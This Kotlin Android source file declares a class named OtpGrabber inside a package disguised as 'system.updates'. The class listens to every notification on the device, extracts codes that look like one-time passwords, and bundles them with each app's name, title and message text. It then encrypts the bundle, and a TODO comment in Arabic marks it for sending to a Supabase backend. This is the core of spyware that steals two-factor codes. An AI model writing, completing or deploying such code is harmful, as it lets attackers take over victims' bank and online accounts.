package com.system.updates.communication

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.system.updates.core.CryptoManager

class OtpGrabber : NotificationListenerService() {

    private const val TAG = "OtpGrabber"

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""

        // البحث عن أي تسلسل مكون من 4 إلى 8 أحرف/أرقام (يشمل رموز التفعيل)
        val otpPattern = Regex("\\b(\\w{4,8})\\b")
        val match = otpPattern.find(text)

        if (match != null) {
            val possibleCode = match.value
            Log.d(TAG, "Possible OTP detected from $packageName: $possibleCode")

            // تجميع معلومات الإشعار
            val logData = "App: $packageName | Title: $title | Content: $text"
            val encryptedData = CryptoManager.encryptHybrid(logData.toByteArray())

            // TODO: إرسال encryptedData إلى Supabase
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // يمكن استخدامها لاحقاً
    }
}
